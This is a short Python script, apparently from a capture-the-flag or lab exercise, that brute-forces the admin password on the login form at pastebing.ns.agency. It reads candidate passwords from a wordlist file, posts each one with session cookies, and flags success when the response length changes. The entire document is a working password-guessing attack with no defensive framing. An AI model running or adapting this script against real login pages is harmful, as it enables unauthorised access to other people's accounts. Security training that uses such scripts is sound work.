# fill in the relevant fields for the cookies dict before running

import requests
import sys

cookies={'zid': '', 'token': ''}

with open(sys.argv[1], 'r') as f:
    i = 0
    lines = f.readlines()
    total = str(len(lines))
    for line in lines:
        i += 1
        test_pass = line.strip()
        payload = {
            'username': 'admin',
            'password': test_pass
        }
        r = requests.post('http://pastebing.ns.agency/login', data=payload, cookies=cookies)
        if len(r.text) != 2960:
            print('SUCCESS (' + str(i) + '/' + total + '): ' + test_pass)
            break
        else:
            print('FAILURE (' + str(i) + '/' + total + '): ' + test_pass)
